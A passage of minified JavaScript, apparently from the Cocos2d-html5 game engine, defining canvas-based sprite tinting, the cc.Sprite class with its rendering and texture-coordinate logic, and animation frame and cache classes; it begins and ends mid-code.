    cc.defineGetterSetter(t, "batchNode", t.getBatchNode, t.setBatchNode),
    cc.defineGetterSetter(t, "quad", t.getQuad)
},
cc.generateTextureCacheForColor = function(t) {
    function e() {
        var e = cc.generateTextureCacheForColor,
        n = t.width,
        r = t.height;
        i[0].width = n,
        i[0].height = r,
        i[1].width = n,
        i[1].height = r,
        i[2].width = n,
        i[2].height = r,
        i[3].width = n,
        i[3].height = r,
        e.canvas.width = n,
        e.canvas.height = r;
        var c = e.canvas.getContext("2d");
        c.drawImage(t, 0, 0),
        e.tempCanvas.width = n,
        e.tempCanvas.height = r;
        for (var c = c.getImageData(0, 0, n, r).data, o = 0; 4 > o; o++) {
            var s = i[o].getContext("2d");
            s.getImageData(0, 0, n, r).data,
            e.tempCtx.drawImage(t, 0, 0);
            for (var a = e.tempCtx.getImageData(0, 0, n, r), h = a.data, l = 0; l < c.length; l += 4) h[l] = 0 === o ? c[l] : 0,
            h[l + 1] = 1 === o ? c[l + 1] : 0,
            h[l + 2] = 2 === o ? c[l + 2] : 0,
            h[l + 3] = c[l + 3];
            s.putImageData(a, 0, 0)
        }
        t.onload = null
    }
    if (t.channelCache) return t.channelCache;
    var i = [cc.newElement("canvas"), cc.newElement("canvas"), cc.newElement("canvas"), cc.newElement("canvas")];
    try {
        e()
    } catch(n) {
        t.onload = e
    }
    return t.channelCache = i
},
cc.generateTextureCacheForColor.canvas = cc.newElement("canvas"),
cc.generateTextureCacheForColor.tempCanvas = cc.newElement("canvas"),
cc.generateTextureCacheForColor.tempCtx = cc.generateTextureCacheForColor.tempCanvas.getContext("2d"),
cc.generateTintImage2 = function(t, e, i) {
    i || (i = cc.rect(0, 0, t.width, t.height), i = cc.rectPixelsToPoints(i));
    var n = cc.newElement("canvas"),
    r = n.getContext("2d");
    return n.width != i.width && (n.width = i.width),
    n.height != i.height && (n.height = i.height),
    r.save(),
    r.drawImage(t, i.x, i.y, i.width, i.height, 0, 0, i.width, i.height),
    r.globalCompositeOperation = "source-in",
    r.globalAlpha = e.a / 255,
    r.fillStyle = "rgb(" + e.r + "," + e.g + "," + e.b + ")",
    r.fillRect(0, 0, i.width, i.height),
    r.restore(),
    n
},
cc.generateTintImage = function(t, e, i, n, r) {
    n || (n = cc.rect(0, 0, t.width, t.height)),
    t = i.r / 255;
    var c = i.g / 255;
    i = i.b / 255;
    var o, s = Math.min(n.width, e[0].width),
    a = Math.min(n.height, e[0].height);
    r ? (o = r.getContext("2d"), o.clearRect(0, 0, s, a)) : (r = cc.newElement("canvas"), r.width = s, r.height = a, o = r.getContext("2d")),
    o.save(),
    o.globalCompositeOperation = "lighter";
    var h = o.globalAlpha;
    return t > 0 && (o.globalAlpha = t * h, o.drawImage(e[0], n.x, n.y, s, a, 0, 0, s, a)),
    c > 0 && (o.globalAlpha = c * h, o.drawImage(e[1], n.x, n.y, s, a, 0, 0, s, a)),
    i > 0 && (o.globalAlpha = i * h, o.drawImage(e[2], n.x, n.y, s, a, 0, 0, s, a)),
    1 > t + c + i && (o.globalAlpha = h, o.drawImage(e[3], n.x, n.y, s, a, 0, 0, s, a)),
    o.restore(),
    r
},
cc.cutRotateImageToCanvas = function(t, e) {
    if (!t) return null;
    if (!e) return t;
    var i = cc.newElement("canvas");
    i.width = e.width,
    i.height = e.height;
    var n = i.getContext("2d");
    return n.translate(i.width / 2, i.height / 2),
    n.rotate( - 1.5707963267948966),
    n.drawImage(t, e.x, e.y, e.height, e.width, -e.height / 2, -e.width / 2, e.height, e.width),
    i
},
cc.Sprite = cc.NodeRGBA.extend({
    RGBAProtocol: !0,
    dirty: !1,
    atlasIndex: 0,
    textureAtlas: null,
    _batchNode: null,
    _recursiveDirty: null,
    _hasChildren: null,
    _shouldBeHidden: !1,
    _transformToBatch: null,
    _blendFunc: null,
    _texture: null,
    _rect: null,
    _rectRotated: !1,
    _offsetPosition: null,
    _unflippedOffsetPositionFromCenter: null,
    _opacityModifyRGB: !1,
    _flippedX: !1,
    _flippedY: !1,
    _textureLoaded: !1,
    _loadedEventListeners: null,
    _newTextureWhenChangeColor: null,
    _className: "Sprite",
    textureLoaded: function() {
        return this._textureLoaded
    },
    addLoadedEventListener: function(t, e) {
        this._loadedEventListeners || (this._loadedEventListeners = []),
        this._loadedEventListeners.push({
            eventCallback: t,
            eventTarget: e
        })
    },
    _callLoadedEventCallbacks: function() {
        if (this._loadedEventListeners) {
            for (var t = this._loadedEventListeners,
            e = 0,
            i = t.length; i > e; e++) {
                var n = t[e];
                n.eventCallback.call(n.eventTarget, this)
            }
            t.length = 0
        }
    },
    isDirty: function() {
        return this.dirty
    },
    setDirty: function(t) {
        this.dirty = t
    },
    isTextureRectRotated: function() {
        return this._rectRotated
    },
    getAtlasIndex: function() {
        return this.atlasIndex
    },
    setAtlasIndex: function(t) {
        this.atlasIndex = t
    },
    getTextureRect: function() {
        return cc.rect(this._rect.x, this._rect.y, this._rect.width, this._rect.height)
    },
    getTextureAtlas: function() {
        return this.textureAtlas
    },
    setTextureAtlas: function(t) {
        this.textureAtlas = t
    },
    getOffsetPosition: function() {
        return this._offsetPosition
    },
    _getOffsetX: function() {
        return this._offsetPosition.x
    },
    _getOffsetY: function() {
        return this._offsetPosition.y
    },
    getBlendFunc: function() {
        return this._blendFunc
    },
    initWithSpriteFrame: function(t) {
        cc.assert(t, cc._LogInfos.Sprite_initWithSpriteFrame),
        t.textureLoaded() || (this._textureLoaded = !1, t.addLoadedEventListener(this._spriteFrameLoadedCallback, this));
        var e = cc._renderType === cc._RENDER_TYPE_CANVAS ? !1 : t._rotated,
        e = this.initWithTexture(t.getTexture(), t.getRect(), e);
        return this.setSpriteFrame(t),
        e
    },
    _spriteFrameLoadedCallback: null,
    initWithSpriteFrameName: function(t) {
        cc.assert(t, cc._LogInfos.Sprite_initWithSpriteFrameName);
        var e = cc.spriteFrameCache.getSpriteFrame(t);
        return cc.assert(e, t + cc._LogInfos.Sprite_initWithSpriteFrameName1),
        this.initWithSpriteFrame(e)
    },
    useBatchNode: function(t) {
        this.textureAtlas = t.textureAtlas,
        this._batchNode = t
    },
    setVertexRect: function(t) {
        this._rect.x = t.x,
        this._rect.y = t.y,
        this._rect.width = t.width,
        this._rect.height = t.height
    },
    sortAllChildren: function() {
        if (this._reorderChildDirty) {
            var t, e, i, n = this._children,
            r = n.length;
            for (t = 1; r > t; t++) {
                for (i = n[t], e = t - 1; e >= 0;) {
                    if (i._localZOrder < n[e]._localZOrder) n[e + 1] = n[e];
                    else {
                        if (! (i._localZOrder === n[e]._localZOrder && i.arrivalOrder < n[e].arrivalOrder)) break;
                        n[e + 1] = n[e]
                    }
                    e--
                }
                n[e + 1] = i
            }
            this._batchNode && this._arrayMakeObjectsPerformSelector(n, cc.Node.StateCallbackType.sortAllChildren),
            this._reorderChildDirty = !1
        }
    },
    reorderChild: function(t, e) {
        cc.assert(t, cc._LogInfos.Sprite_reorderChild_2),
        -1 === this._children.indexOf(t) ? cc.log(cc._LogInfos.Sprite_reorderChild) : e !== t.zIndex && (this._batchNode && !this._reorderChildDirty && (this._setReorderChildDirtyRecursively(), this._batchNode.reorderBatch(!0)), cc.Node.prototype.reorderChild.call(this, t, e))
    },
    removeChild: function(t, e) {
        this._batchNode && this._batchNode.removeSpriteFromAtlas(t),
        cc.Node.prototype.removeChild.call(this, t, e)
    },
    removeAllChildren: function(t) {
        var e = this._children,
        i = this._batchNode;
        if (i && null != e) for (var n = 0,
        r = e.length; r > n; n++) i.removeSpriteFromAtlas(e[n]);
        cc.Node.prototype.removeAllChildren.call(this, t),
        this._hasChildren = !1
    },
    setDirtyRecursively: function(t) {
        this.dirty = this._recursiveDirty = t,
        t = this._children;
        for (var e, i = t ? t.length: 0, n = 0; i > n; n++) e = t[n],
        e instanceof cc.Sprite && e.setDirtyRecursively(!0)
    },
    setNodeDirty: function(t) {
        cc.Node.prototype.setNodeDirty.call(this),
        !t && this._batchNode && !this._recursiveDirty && (this._hasChildren ? this.setDirtyRecursively(!0) : this.dirty = this._recursiveDirty = !0)
    },
    ignoreAnchorPointForPosition: function(t) {
        this._batchNode ? cc.log(cc._LogInfos.Sprite_ignoreAnchorPointForPosition) : cc.Node.prototype.ignoreAnchorPointForPosition.call(this, t)
    },
    setFlippedX: function(t) {
        this._flippedX != t && (this._flippedX = t, this.setTextureRect(this._rect, this._rectRotated, this._contentSize), this.setNodeDirty(!0))
    },
    setFlippedY: function(t) {
        this._flippedY != t && (this._flippedY = t, this.setTextureRect(this._rect, this._rectRotated, this._contentSize), this.setNodeDirty(!0))
    },
    isFlippedX: function() {
        return this._flippedX
    },
    isFlippedY: function() {
        return this._flippedY
    },
    setOpacityModifyRGB: null,
    isOpacityModifyRGB: function() {
        return this._opacityModifyRGB
    },
    updateDisplayedOpacity: null,
    setDisplayFrameWithAnimationName: function(t, e) {
        cc.assert(t, cc._LogInfos.Sprite_setDisplayFrameWithAnimationName_3);
        var i = cc.animationCache.getAnimation(t);
        i ? (i = i.getFrames()[e]) ? this.setSpriteFrame(i.getSpriteFrame()) : cc.log(cc._LogInfos.Sprite_setDisplayFrameWithAnimationName_2) : cc.log(cc._LogInfos.Sprite_setDisplayFrameWithAnimationName)
    },
    getBatchNode: function() {
        return this._batchNode
    },
    _setReorderChildDirtyRecursively: function() {
        if (!this._reorderChildDirty) {
            this._reorderChildDirty = !0;
            for (var t = this._parent; t && t != this._batchNode;) t._setReorderChildDirtyRecursively(),
            t = t.parent
        }
    },
    getTexture: function() {
        return this._texture
    },
    _quad: null,
    _quadWebBuffer: null,
    _quadDirty: !1,
    _colorized: !1,
    _isLighterMode: !1,
    _originalTexture: null,
    _textureRect_Canvas: null,
    _drawSize_Canvas: null,
    ctor: null,
    _softInit: function(t, e, i) {
        void 0 === t ? cc.Sprite.prototype.init.call(this) : "string" == typeof t ? "#" === t[0] ? (t = t.substr(1, t.length - 1), t = cc.spriteFrameCache.getSpriteFrame(t), this.initWithSpriteFrame(t)) : cc.Sprite.prototype.init.call(this, t, e) : "object" == typeof t && (t instanceof cc.Texture2D ? this.initWithTexture(t, e, i) : t instanceof cc.SpriteFrame ? this.initWithSpriteFrame(t) : (t instanceof HTMLImageElement || t instanceof HTMLCanvasElement) && (e = new cc.Texture2D, e.initWithElement(t), e.handleLoadedTexture(), this.initWithTexture(e)))
    },
    getQuad: function() {
        return this._quad
    },
    setBlendFunc: null,
    init: null,
    initWithFile: function(t, e) {
        cc.assert(t, cc._LogInfos.Sprite_initWithFile);
        var i = cc.textureCache.textureForKey(t);
        if (i) {
            if (!e) {
                var n = i.getContentSize();
                e = cc.rect(0, 0, n.width, n.height)
            }
            return this.initWithTexture(i, e)
        }
        return i = cc.textureCache.addImage(t),
        this.initWithTexture(i, e || cc.rect(0, 0, i._contentSize.width, i._contentSize.height))
    },
    initWithTexture: null,
    _textureLoadedCallback: null,
    setTextureRect: null,
    updateTransform: null,
    addChild: null,
    updateColor: function() {
        var t = this._displayedColor,
        e = this._displayedOpacity,
        t = {
            r: t.r,
            g: t.g,
            b: t.b,
            a: e
        };
        this._opacityModifyRGB && (t.r *= e / 255, t.g *= e / 255, t.b *= e / 255),
        e = this._quad,
        e.bl.colors = t,
        e.br.colors = t,
        e.tl.colors = t,
        e.tr.colors = t,
        this._batchNode && (this.atlasIndex != cc.Sprite.INDEX_NOT_INITIALIZED ? this.textureAtlas.updateQuad(e, this.atlasIndex) : this.dirty = !0),
        this._quadDirty = !0
    },
    setOpacity: null,
    setColor: null,
    updateDisplayedColor: null,
    setSpriteFrame: null,
    setDisplayFrame: function(t) {
        cc.log(cc._LogInfos.Sprite_setDisplayFrame),
        this.setSpriteFrame(t)
    },
    isFrameDisplayed: null,
    displayFrame: function() {
        return cc.SpriteFrame.create(this._texture, cc.rectPointsToPixels(this._rect), this._rectRotated, cc.pointPointsToPixels(this._unflippedOffsetPositionFromCenter), cc.sizePointsToPixels(this._contentSize))
    },
    setBatchNode: null,
    setTexture: null,
    _updateBlendFunc: function() {
        this._batchNode ? cc.log(cc._LogInfos.Sprite__updateBlendFunc) : this._texture && this._texture.hasPremultipliedAlpha() ? (this._blendFunc.src = cc.BLEND_SRC, this._blendFunc.dst = cc.BLEND_DST, this.opacityModifyRGB = !0) : (this._blendFunc.src = cc.SRC_ALPHA, this._blendFunc.dst = cc.ONE_MINUS_SRC_ALPHA, this.opacityModifyRGB = !1)
    },
    _changeTextureColor: function() {
        var t, e = this._texture,
        i = this._textureRect_Canvas;
        e && i.validRect && this._originalTexture && (t = e.getHtmlElementObj()) && (e = cc.textureCache.getTextureColors(this._originalTexture.getHtmlElementObj())) && (this._colorized = !0, t instanceof HTMLCanvasElement && !this._rectRotated && !this._newTextureWhenChangeColor ? cc.generateTintImage(t, e, this._displayedColor, i, t) : (t = cc.generateTintImage(t, e, this._displayedColor, i), e = new cc.Texture2D, e.initWithElement(t), e.handleLoadedTexture(), this.texture = e))
    },
    _setTextureCoords: function(t) {
        t = cc.rectPointsToPixels(t);
        var e = this._batchNode ? this.textureAtlas.texture: this._texture;
        if (e) {
            var i, n = e.pixelsWidth,
            r = e.pixelsHeight,
            c = this._quad;
            this._rectRotated ? (cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL ? (e = (2 * t.x + 1) / (2 * n), n = e + (2 * t.height - 2) / (2 * n), i = (2 * t.y + 1) / (2 * r), t = i + (2 * t.width - 2) / (2 * r)) : (e = t.x / n, n = (t.x + t.height) / n, i = t.y / r, t = (t.y + t.width) / r), this._flippedX && (r = i, i = t, t = r), this._flippedY && (r = e, e = n, n = r), c.bl.texCoords.u = e, c.bl.texCoords.v = i, c.br.texCoords.u = e, c.br.texCoords.v = t, c.tl.texCoords.u = n, c.tl.texCoords.v = i, c.tr.texCoords.u = n, c.tr.texCoords.v = t) : (cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL ? (e = (2 * t.x + 1) / (2 * n), n = e + (2 * t.width - 2) / (2 * n), i = (2 * t.y + 1) / (2 * r), t = i + (2 * t.height - 2) / (2 * r)) : (e = t.x / n, n = (t.x + t.width) / n, i = t.y / r, t = (t.y + t.height) / r), this._flippedX && (r = e, e = n, n = r), this._flippedY && (r = i, i = t, t = r), c.bl.texCoords.u = e, c.bl.texCoords.v = t, c.br.texCoords.u = n, c.br.texCoords.v = t, c.tl.texCoords.u = e, c.tl.texCoords.v = i, c.tr.texCoords.u = n, c.tr.texCoords.v = i),
            this._quadDirty = !0
        }
    },
    draw: null
}),
cc.Sprite.create = function(t, e, i) {
    return new cc.Sprite(t, e, i)
},
cc.Sprite.INDEX_NOT_INITIALIZED = -1,
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.Sprite.prototype, _p._spriteFrameLoadedCallback = function(t) {
    this.setNodeDirty(!0),
    this.setTextureRect(t.getRect(), t.isRotated(), t.getOriginalSize()),
    t = this.color,
    (255 !== t.r || 255 !== t.g || 255 !== t.b) && this._changeTextureColor(),
    this._callLoadedEventCallbacks()
},
_p.setOpacityModifyRGB = function(t) {
    this._opacityModifyRGB !== t && (this._opacityModifyRGB = t, this.setNodeDirty(!0))
},
_p.updateDisplayedOpacity = function(t) {
    cc.NodeRGBA.prototype.updateDisplayedOpacity.call(this, t),
    this._setNodeDirtyForCache()
},
_p.ctor = function(t, e, i) {
    cc.NodeRGBA.prototype.ctor.call(this),
    this._shouldBeHidden = !1,
    this._offsetPosition = cc.p(0, 0),
    this._unflippedOffsetPositionFromCenter = cc.p(0, 0),
    this._blendFunc = {
        src: cc.BLEND_SRC,
        dst: cc.BLEND_DST
    },
    this._rect = cc.rect(0, 0, 0, 0),
    this._newTextureWhenChangeColor = !1,
    this._textureLoaded = !0,
    this._textureRect_Canvas = {
        x: 0,
        y: 0,
        width: 0,
        height: 0,
        validRect: !1
    },
    this._drawSize_Canvas = cc.size(0, 0),
    this._softInit(t, e, i)
},
_p.setBlendFunc = function(t, e) {
    var i = this._blendFunc;
    void 0 === e ? (i.src = t.src, i.dst = t.dst) : (i.src = t, i.dst = e),
    this._isLighterMode = i && (i.src == cc.SRC_ALPHA && i.dst == cc.ONE || i.src == cc.ONE && i.dst == cc.ONE)
},
_p.init = function() {
    return 0 < arguments.length ? this.initWithFile(arguments[0], arguments[1]) : (cc.NodeRGBA.prototype.init.call(this), this.dirty = this._recursiveDirty = !1, this._opacityModifyRGB = !0, this._blendFunc.src = cc.BLEND_SRC, this._blendFunc.dst = cc.BLEND_DST, this.texture = null, this._textureLoaded = !0, this._flippedX = this._flippedY = !1, this.anchorY = this.anchorX = .5, this._offsetPosition.x = 0, this._offsetPosition.y = 0, this._hasChildren = !1, this.setTextureRect(cc.rect(0, 0, 0, 0), !1, cc.size(0, 0)), !0)
},
_p.initWithTexture = function(t, e, i) {
    if (cc.assert(0 != arguments.length, cc._LogInfos.CCSpriteBatchNode_initWithTexture), (i = i || !1) && t.isLoaded()) {
        var n = t.getHtmlElementObj(),
        n = cc.cutRotateImageToCanvas(n, e),
        r = new cc.Texture2D;
        r.initWithElement(n),
        r.handleLoadedTexture(),
        t = r,
        this._rect = cc.rect(0, 0, e.width, e.height)
    }
    return cc.NodeRGBA.prototype.init.call(this) ? (this._batchNode = null, this.dirty = this._recursiveDirty = !1, this._opacityModifyRGB = !0, this._blendFunc.src = cc.BLEND_SRC, this._blendFunc.dst = cc.BLEND_DST, this._flippedX = this._flippedY = !1, this.anchorY = this.anchorX = .5, this._offsetPosition.x = 0, this._offsetPosition.y = 0, this._hasChildren = !1, this._textureLoaded = n = t.isLoaded(), n ? (e || (e = cc.rect(0, 0, t.width, t.height)), t && (n = e.y + e.height, e.x + e.width > t.width && cc.error(cc._LogInfos.RectWidth, t.url), n > t.height && cc.error(cc._LogInfos.RectHeight, t.url)), this.texture = this._originalTexture = t, this.setTextureRect(e, i), this.batchNode = null, !0) : (this._rectRotated = i, e && (this._rect.x = e.x, this._rect.y = e.y, this._rect.width = e.width, this._rect.height = e.height), t.addLoadedEventListener(this._textureLoadedCallback, this), !0)) : !1
},
_p._textureLoadedCallback = function(t) {
    if (!this._textureLoaded) {
        this._textureLoaded = !0;
        var e = this._rect;
        e ? cc._rectEqualToZero(e) && (e.width = t.width, e.height = t.height) : e = cc.rect(0, 0, t.width, t.height),
        this.texture = this._originalTexture = t,
        this.setTextureRect(e, this._rectRotated),
        this.batchNode = this._batchNode,
        this._callLoadedEventCallbacks()
    }
},
_p.setTextureRect = function(t, e, i) {
    this._rectRotated = e || !1,
    this.setContentSize(i || t),
    this.setVertexRect(t),
    e = this._textureRect_Canvas,
    i = cc.contentScaleFactor(),
    e.x = 0 | t.x * i,
    e.y = 0 | t.y * i,
    e.width = 0 | t.width * i,
    e.height = 0 | t.height * i,
    e.validRect = !(0 === e.width || 0 === e.height || 0 > e.x || 0 > e.y),
    t = this._unflippedOffsetPositionFromCenter,
    this._flippedX && (t.x = -t.x),
    this._flippedY && (t.y = -t.y),
    this._offsetPosition.x = t.x + (this._contentSize.width - this._rect.width) / 2,
    this._offsetPosition.y = t.y + (this._contentSize.height - this._rect.height) / 2,
    this._batchNode && (this.dirty = !0)
},
_p.updateTransform = function() {
    if (this.dirty) {
        var t = this._parent; ! this._visible || t && t != this._batchNode && t._shouldBeHidden ? this._shouldBeHidden = !0 : (this._shouldBeHidden = !1, this._transformToBatch = t && t != this._batchNode ? cc.AffineTransformConcat(this.nodeToParentTransform(), t._transformToBatch) : this.nodeToParentTransform()),
        this.dirty = this._recursiveDirty = !1
    }
    this._hasChildren && this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.updateTransform)
},
_p.addChild = function(t, e, i) {
    cc.assert(t, cc._LogInfos.CCSpriteBatchNode_addChild_2),
    null == e && (e = t._localZOrder),
    null == i && (i = t.tag),
    cc.NodeRGBA.prototype.addChild.call(this, t, e, i),
    this._hasChildren = !0
},
_p.setOpacity = function(t) {
    cc.NodeRGBA.prototype.setOpacity.call(this, t),
    this._setNodeDirtyForCache()
},
_p.setColor = function(t) {
    var e = this.color;
    e.r === t.r && e.g === t.g && e.b === t.b || (cc.NodeRGBA.prototype.setColor.call(this, t), this._changeTextureColor(), this._setNodeDirtyForCache())
},
_p.updateDisplayedColor = function(t) {
    var e = this.color;
    cc.NodeRGBA.prototype.updateDisplayedColor.call(this, t),
    t = this._displayedColor,
    e.r === t.r && e.g === t.g && e.b === t.b || (this._changeTextureColor(), this._setNodeDirtyForCache())
},
_p.setSpriteFrame = function(t) {
    var e = this;
    "string" == typeof t && (t = cc.spriteFrameCache.getSpriteFrame(t), cc.assert(t, cc._LogInfos.CCSpriteBatchNode_setSpriteFrame)),
    e.setNodeDirty(!0);
    var i = t.getOffset();
    e._unflippedOffsetPositionFromCenter.x = i.x,
    e._unflippedOffsetPositionFromCenter.y = i.y,
    e._rectRotated = t.isRotated();
    var i = t.getTexture(),
    n = t.textureLoaded();
    n || (e._textureLoaded = !1, t.addLoadedEventListener(function(t) {
        e._textureLoaded = !0;
        var i = t.getTexture();
        i != e._texture && (e.texture = i),
        e.setTextureRect(t.getRect(), t.isRotated(), t.getOriginalSize()),
        e._callLoadedEventCallbacks()
    },
    e)),
    i != e._texture && (e.texture = i),
    e._rectRotated && (e._originalTexture = i),
    e.setTextureRect(t.getRect(), e._rectRotated, t.getOriginalSize()),
    e._colorized = !1,
    n && (t = e.color, (255 !== t.r || 255 !== t.g || 255 !== t.b) && e._changeTextureColor())
},
_p.isFrameDisplayed = function(t) {
    return t.getTexture() != this._texture ? !1 : cc.rectEqualToRect(t.getRect(), this._rect)
},
_p.setBatchNode = function(t) { (this._batchNode = t) ? (this._transformToBatch = cc.AffineTransformIdentity(), this.textureAtlas = this._batchNode.textureAtlas) : (this.atlasIndex = cc.Sprite.INDEX_NOT_INITIALIZED, this.textureAtlas = null, this.dirty = this._recursiveDirty = !1)
},
_p.setTexture = function(t) {
    t && "string" == typeof t ? (t = cc.textureCache.addImage(t), this.setTexture(t), t = t.getContentSize(), this.setTextureRect(cc.rect(0, 0, t.width, t.height))) : (cc.assert(!t || t instanceof cc.Texture2D, cc._LogInfos.CCSpriteBatchNode_setTexture), this._texture != t && (t && t.getHtmlElementObj() instanceof HTMLImageElement && (this._originalTexture = t), this._texture = t))
},
_p.draw = function(t) {
    if (this._textureLoaded) {
        t = t || cc._renderContext,
        this._isLighterMode && (t.globalCompositeOperation = "lighter");
        var e = cc.view.getScaleX(),
        i = cc.view.getScaleY();
        t.globalAlpha = this._displayedOpacity / 255;
        var n = this._rect,
        r = this._contentSize,
        c = this._offsetPosition,
        o = this._drawSize_Canvas,
        s = 0 | c.x,
        a = -c.y - n.height,
        h = this._textureRect_Canvas;
        o.width = n.width * e,
        o.height = n.height * i,
        (this._flippedX || this._flippedY) && (t.save(), this._flippedX && (s = -c.x - n.width, t.scale( - 1, 1)), this._flippedY && (a = c.y, t.scale(1, -1))),
        s *= e,
        a *= i,
        this._texture && h.validRect ? (r = this._texture.getHtmlElementObj(), this._colorized ? t.drawImage(r, 0, 0, h.width, h.height, s, a, o.width, o.height) : t.drawImage(r, h.x, h.y, h.width, h.height, s, a, o.width, o.height)) : !this._texture && h.validRect && (o = this.color, t.fillStyle = "rgba(" + o.r + "," + o.g + "," + o.b + ",1)", t.fillRect(s, a, r.width * e, r.height * i)),
        1 === cc.SPRITE_DEBUG_DRAW || this._showNode ? (t.strokeStyle = "rgba(0,255,0,1)", s /= e, a = -(a / i), s = [cc.p(s, a), cc.p(s + n.width, a), cc.p(s + n.width, a - n.height), cc.p(s, a - n.height)], cc._drawingUtil.drawPoly(s, 4, !0)) : 2 === cc.SPRITE_DEBUG_DRAW && (t.strokeStyle = "rgba(0,255,0,1)", e = this._rect, a = -a, s = [cc.p(s, a), cc.p(s + e.width, a), cc.p(s + e.width, a - e.height), cc.p(s, a - e.height)], cc._drawingUtil.drawPoly(s, 4, !0)),
        (this._flippedX || this._flippedY) && t.restore(),
        cc.g_NumberOfDraws++
    }
},
delete _p) : (cc.assert("function" == typeof cc._tmp.WebGLSprite, cc._LogInfos.MissingFile, "SpritesWebGL.js"), cc._tmp.WebGLSprite(), delete cc._tmp.WebGLSprite),
cc.assert("function" == typeof cc._tmp.PrototypeSprite, cc._LogInfos.MissingFile, "SpritesPropertyDefine.js"),
cc._tmp.PrototypeSprite(),
delete cc._tmp.PrototypeSprite,
cc.AnimationFrame = cc.Class.extend({
    _spriteFrame: null,
    _delayPerUnit: 0,
    _userInfo: null,
    ctor: function(t, e, i) {
        this._spriteFrame = t || null,
        this._delayPerUnit = e || 0,
        this._userInfo = i || null
    },
    clone: function() {
        var t = new cc.AnimationFrame;
        return t.initWithSpriteFrame(this._spriteFrame.clone(), this._delayPerUnit, this._userInfo),
        t
    },
    copyWithZone: function() {
        return cc.clone(this)
    },
    copy: function(t) {
        return t = new cc.AnimationFrame,
        t.initWithSpriteFrame(this._spriteFrame.clone(), this._delayPerUnit, this._userInfo),
        t
    },
    initWithSpriteFrame: function(t, e, i) {
        return this._spriteFrame = t,
        this._delayPerUnit = e,
        this._userInfo = i,
        !0
    },
    getSpriteFrame: function() {
        return this._spriteFrame
    },
    setSpriteFrame: function(t) {
        this._spriteFrame = t
    },
    getDelayUnits: function() {
        return this._delayPerUnit
    },
    setDelayUnits: function(t) {
        this._delayPerUnit = t
    },
    getUserInfo: function() {
        return this._userInfo
    },
    setUserInfo: function(t) {
        this._userInfo = t
    }
}),
cc.AnimationFrame.create = function(t, e, i) {
    return new cc.AnimationFrame(t, e, i)
},
cc.Animation = cc.Class.extend({
    _frames: null,
    _loops: 0,
    _restoreOriginalFrame: !1,
    _duration: 0,
    _delayPerUnit: 0,
    _totalDelayUnits: 0,
    ctor: function(t, e, i) {
        if (this._frames = [], void 0 === t) this.initWithSpriteFrames(null, 0);
        else {
            var n = t[0];
            n && (n instanceof cc.SpriteFrame ? this.initWithSpriteFrames(t, e, i) : n instanceof cc.AnimationFrame && this.initWithAnimationFrames(t, e, i))
        }
    },
    getFrames: function() {
        return this._frames
    },
    setFrames: function(t) {
        this._frames = t
    },
    addSpriteFrame: function(t) {
        var e = new cc.AnimationFrame;
        e.initWithSpriteFrame(t, 1, null),
        this._frames.push(e),
        this._totalDelayUnits++
    },
    addSpriteFrameWithFile: function(t) {
        t = cc.textureCache.addImage(t);
        var e = cc.rect(0, 0, 0, 0);
        e.width = t.width,
        e.height = t.height,
        t = cc.SpriteFrame.create(t, e),
        this.addSpriteFrame(t)
    },
    addSpriteFrameWithTexture: function(t, e) {
        var i = cc.SpriteFrame.create(t, e);
        this.addSpriteFrame(i)
    },
    initWithAnimationFrames: function(t, e, i) {
        for (cc.arrayVerifyType(t, cc.AnimationFrame), this._delayPerUnit = e, this._loops = void 0 === i ? 1 : i, this._totalDelayUnits = 0, e = this._frames, i = e.length = 0; i < t.length; i++) {
            var n = t[i];
            e.push(n),
            this._totalDelayUnits += n.getDelayUnits()
        }
        return ! 0
    },
    clone: function() {
        var t = new cc.Animation;
        return t.initWithAnimationFrames(this._copyFrames(), this._delayPerUnit, this._loops),
        t.setRestoreOriginalFrame(this._restoreOriginalFrame),
        t
    },
    copyWithZone: function(t) {
        return t = new cc.Animation,
        t.initWithAnimationFrames(this._copyFrames(), this._delayPerUnit, this._loops),
        t.setRestoreOriginalFrame(this._restoreOriginalFrame),
        t
    },
    _copyFrames: function() {
        for (var t = [], e = 0; e < this._frames.length; e++) t.push(this._frames[e].clone());
        return t
    },
    copy: function() {
        return this.copyWithZone(null)
    },
    getLoops: function() {
        return this._loops
    },
    setLoops: function(t) {
        this._loops = t
    },
    setRestoreOriginalFrame: function(t) {
        this._restoreOriginalFrame = t
    },
    getRestoreOriginalFrame: function() {
        return this._restoreOriginalFrame
    },
    getDuration: function() {
        return this._totalDelayUnits * this._delayPerUnit
    },
    getDelayPerUnit: function() {
        return this._delayPerUnit
    },
    setDelayPerUnit: function(t) {
        this._delayPerUnit = t
    },
    getTotalDelayUnits: function() {
        return this._totalDelayUnits
    },
    initWithSpriteFrames: function(t, e, i) {
        if (cc.arrayVerifyType(t, cc.SpriteFrame), this._loops = void 0 === i ? 1 : i, this._delayPerUnit = e || 0, this._totalDelayUnits = 0, e = this._frames, e.length = 0, t) {
            for (i = 0; i < t.length; i++) {
                var n = t[i],
                r = new cc.AnimationFrame;
                r.initWithSpriteFrame(n, 1, null),
                e.push(r)
            }
            this._totalDelayUnits += t.length
        }
        return ! 0
    },
    retain: function() {},
    release: function() {}
}),
cc.Animation.create = function(t, e, i) {
    return new cc.Animation(t, e, i)
},
cc.animationCache = {
    _animations: {},
    addAnimation: function(t, e) {
        this._animations[e] = t
    },
    removeAnimation: function(t) {
        t && this._animations[t] && delete this._animations[t]
    },
    getAnimation: function(t) {
        return this._animations[t] ? this._animations[t] : null
    },
    _addAnimationsWithDictionary: function(t, e) {
        var i = t.animations;
        if (i) {
            var n = 1,
            r = t.properties;
            if (r) for (var n = null != r.format ? parseInt(r.format) : n, r = r.spritesheets, c = cc.spriteFrameCache, o = cc.path, s = 0; s < r.length; s++) c.addSpriteFrames(o.changeBasename(e, r[s]));
            switch (n) {
            case 1:
                this._parseVersion1(i);
                break;
            case 2:
                this._parseVersion2(i);
                break;
            default:
                cc.log(cc._LogInfos.animationCache__addAnimationsWithDictionary_2)
            }
        } else cc.log(cc._LogInfos.animationCache__addAnimationsWithDictionary)
    },
    addAnimations: function(t) {
        cc.assert(t, cc._LogInfos.animationCache_addAnimations_2);
        var e = cc.loader.getRes(t);
        e ? this._addAnimationsWithDictionary(e, t) : cc.log(cc._LogInfos.animationCache_addAnimations)
    },
    _parseVersion1: function(t) {
        var e, i = cc.spriteFrameCache;
        for (e in t) {
            var n = t[e],
            r = n.frames,
            n = parseFloat(n.delay) || 0,
            c = null;
            if (r) {
